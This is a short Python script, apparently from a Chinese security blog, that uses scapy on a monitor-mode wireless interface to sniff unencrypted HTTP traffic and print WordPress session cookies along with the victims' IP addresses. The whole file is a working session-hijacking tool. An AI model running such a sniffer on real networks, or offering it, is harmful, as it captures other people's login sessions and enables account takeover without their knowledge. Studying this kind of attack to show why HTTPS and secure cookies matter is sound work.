#!/usr/bin/env python
# -*- coding: utf-8 -*-
# -*- coding: gbk -*-
# Date: 2019/2/20
# Created by 冰河
# Description 解析Wordpress HTTP会话
# 博客 https://blog.csdn.net/l1028386804

import re
from scapy.all import *

def fireCatcher(pkt):
    raw = pkt.sprintf('%Raw.load%')
    r = re.findall('wordpress_[0-9a-fA-F]{32}', raw)
    if r and 'Set' not in raw:
        print pkt.getlayer(IP).src + '>' + pkt.getlayer(IP).dst + ' Cookie:' + r[0]


conf.iface = 'wlan0mon'
sniff(filter='tcp port 80', prn=fireCatcher)
